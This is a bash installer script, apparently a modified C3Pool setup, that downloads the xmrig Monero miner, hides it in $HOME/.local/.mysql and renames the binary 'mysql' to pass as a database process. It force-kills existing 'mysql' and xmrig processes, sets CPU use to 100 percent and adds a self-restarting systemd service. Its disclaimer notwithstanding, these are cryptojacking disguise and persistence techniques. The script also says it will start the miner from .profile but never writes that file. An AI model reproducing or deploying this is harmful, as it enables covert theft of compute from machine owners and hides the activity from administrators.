#!/bin/bash

VERSION=2.11

echo "C3Pool mining setup script v$VERSION."
echo "警告: 请勿将此脚本使用在非法用途,如有发现在非自己所有权的服务器内使用该脚本"
echo "我们将在接到举报后,封禁违法的钱包地址,并将有关信息收集并提交给警方"
echo "(please report issues to support@c3pool.com email with full output of this script with extra \"-x\" \"bash\" option)"
echo

if [ "$(id -u)" == "0" ]; then
  echo "WARNING: Generally it is not adviced to run this script under root"
  echo "警告: 不建议在root用户下使用此脚本"
fi

WALLET=$1
EMAIL=$2

if [ -z $WALLET ]; then
  echo "Script usage:"
  echo "> setup_c3pool_miner.sh <wallet address> [<your email address>]"
  echo "ERROR: Please specify your wallet address"
  exit 1
fi

WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
  echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
  exit 1
fi

if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

if ! type curl >/dev/null; then
  echo "ERROR: This script requires \"curl\" utility to work correctly"
  exit 1
fi

if ! type lscpu >/dev/null; then
  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
fi

CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  exit 1
fi

get_port_based_on_hashrate() {
  local hashrate=$1
  if [ "$hashrate" -le "5000" ]; then
    echo 80
  elif [ "$hashrate" -le "25000" ]; then
    if [ "$hashrate" -gt "5000" ]; then
      echo 13333
    else
      echo 443
    fi
  elif [ "$hashrate" -le "50000" ]; then
    if [ "$hashrate" -gt "25000" ]; then
      echo 15555
    else
      echo 14444
    fi
  elif [ "$hashrate" -le "100000" ]; then
    if [ "$hashrate" -gt "50000" ]; then
      echo 19999
    else
      echo 17777
    fi
  elif [ "$hashrate" -le "1000000" ]; then
    echo 23333
  else
    echo "ERROR: Hashrate too high"
    exit 1
  fi
}

PORT=$(get_port_based_on_hashrate $EXP_MONERO_HASHRATE)
if [ -z $PORT ]; then
  echo "ERROR: Can't compute port"
  exit 1
fi

echo "Computed port: $PORT"

echo "I will download, setup and run in background Monero CPU miner."
echo "将进行下载设置,并在后台中运行xmrig矿工."
echo "If needed, miner in foreground can be started by $HOME/.local/.mysql/miner.sh script."
echo "如果需要,可以通过以下方法启动前台矿工输出 $HOME/.local/.mysql/miner.sh script."
echo "Mining will happen to $WALLET wallet."
echo "将使用 $WALLET 地址进行开采"
if [ ! -z $EMAIL ]; then
  echo "(and $EMAIL email as password to modify wallet options later at https://c3pool.com site)"
fi
echo

if ! sudo -n true 2>/dev/null; then
  echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
  echo "由于脚本无法执行无密码的sudo，因此在您重启后首次登录此主机时，后台开采将从您的 $HOME/.profile 文件开始."
else
  echo "Mining in background will be performed using c3pool_miner systemd service."
  echo "后台开采将使用c3pool_miner systemd服务执行."
fi

echo
echo "JFYI: This host has $CPU_THREADS CPU threads, so projected Monero hashrate is around $EXP_MONERO_HASHRATE H/s."
echo

echo "Sleeping for 15 seconds before continuing (press Ctrl+C to cancel)"
sleep 15
echo

echo "[*] Removing previous c3pool miner (if any)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop c3pool_miner.service
fi
killall -9 mysql
killall -9 xmrig

echo "[*] Removing $HOME/.local/.mysql directory"
rm -rf $HOME/.local/.mysql

echo "[*] Downloading C3Pool advanced version of xmrig to /tmp/xmrig.tar.gz"
if ! curl -L --progress-bar "https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
  exit 1
fi

echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/.local/.mysql"
[ -d $HOME/.local/.mysql ] || mkdir -p $HOME/.local/.mysql
if ! tar xf /tmp/xmrig.tar.gz -C $HOME/.local/.mysql; then
  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/.local/.mysql directory"
  exit 1
fi
rm /tmp/xmrig.tar.gz

echo "[*] Renaming xmrig executable to mysql"
mv $HOME/.local/.mysql/xmrig $HOME/.local/.mysql/mysql
chmod +x $HOME/.local/.mysql/mysql

echo "[*] Checking if advanced version of $HOME/.local/.mysql/mysql works fine"
sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/.local/.mysql/config.json
$HOME/.local/.mysql/mysql --help >/dev/null
if (test $? -ne 0); then
  if [ -f $HOME/.local/.mysql/mysql ]; then
    echo "WARNING: Advanced version of $HOME/.local/.mysql/mysql is not functional"
  else
    echo "WARNING: Advanced version of $HOME/.local/.mysql/mysql was removed by antivirus (or some other problem)"
  fi

  echo "[*] Looking for the latest version of Monero miner"
  LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
  LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`

  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz"
  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
    exit 1
  fi

  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/.local/.mysql"
  if ! tar xf /tmp/xmrig.tar.gz -C $HOME/.local/.mysql --strip=1; then
    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/.local/.mysql directory"
  fi
  rm /tmp/xmrig.tar.gz

  echo "[*] Renaming xmrig executable to mysql"
  mv $HOME/.local/.mysql/xmrig $HOME/.local/.mysql/mysql
  chmod +x $HOME/.local/.mysql/mysql

  echo "[*] Checking if stock version of $HOME/.local/.mysql/mysql works fine"
  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.local/.mysql/config.json
  $HOME/.local/.mysql/mysql --help >/dev/null
  if (test $? -ne 0); then
    if [ -f $HOME/.local/.mysql/mysql ]; then
      echo "ERROR: Stock version of $HOME/.local/.mysql/mysql is not functional too"
    else
      echo "ERROR: Stock version of $HOME/.local/.mysql/mysql was removed by antivirus too"
    fi
    exit 1
  fi
fi

echo "[*] Miner $HOME/.local/.mysql/mysql is OK"

PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
  PASS=na
fi
if [ ! -z $EMAIL ]; then
  PASS="$PASS:$EMAIL"
fi

sed -i 's/"url": *"[^"]*",/"url": "auto.c3pool.org:'$PORT'",/' $HOME/.local/.mysql/config.json
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.local/.mysql/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.local/.mysql/config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.local/.mysql/config.json

echo "[*] Writing $HOME/.local/.mysql/miner.sh"
cat >$HOME/.local/.mysql/miner.sh <<EOF
#!/bin/bash
exec $HOME/.local/.mysql/mysql --config=$HOME/.local/.mysql/config.json --no-color --print-time=60 --donate-level=1
EOF
chmod +x $HOME/.local/.mysql/miner.sh

echo "[*] Writing $HOME/.local/.mysql/run.sh"
cat >$HOME/.local/.mysql/run.sh <<EOF
#!/bin/bash
if sudo -n true 2>/dev/null; then
  sudo systemctl start c3pool_miner.service
else
  echo "No passwordless sudo, running miner in background from .profile"
  nohup $HOME/.local/.mysql/mysql --config=$HOME/.local/.mysql/config.json --donate-level=1 --print-time=60 >$HOME/.local/.mysql/miner.log 2>&1 &
fi
EOF
chmod +x $HOME/.local/.mysql/run.sh

echo "[*] Writing $HOME/.local/.mysql/stop.sh"
cat >$HOME/.local/.mysql/stop.sh <<EOF
#!/bin/bash
if sudo -n true 2>/dev/null; then
  sudo systemctl stop c3pool_miner.service
else
  pkill -9 mysql
fi
EOF
chmod +x $HOME/.local/.mysql/stop.sh

if sudo -n true 2>/dev/null; then
  echo "[*] Writing systemd service file /etc/systemd/system/c3pool_miner.service"
  sudo bash -c "cat >/etc/systemd/system/c3pool_miner.service" <<EOF
[Unit]
Description=C3Pool miner service
After=network.target

[Service]
Type=simple
ExecStart=$HOME/.local/.mysql/mysql --config=$HOME/.local/.mysql/config.json --donate-level=1 --print-time=60
Restart=always
RestartSec=10
Nice=-10
CPUWeight=80

[Install]
WantedBy=multi-user.target
EOF

  echo "[*] Enabling systemd service"
  sudo systemctl daemon-reload
  sudo systemctl enable c3pool_miner.service
  sudo systemctl start c3pool_miner.service
else
  echo "[*] You don't have passwordless sudo, you need to run miner manually or add it to your $HOME/.profile"
fi

echo
echo "Setup complete."
echo "Use $HOME/.local/.mysql/run.sh to start miner, and $HOME/.local/.mysql/stop.sh to stop it."
echo
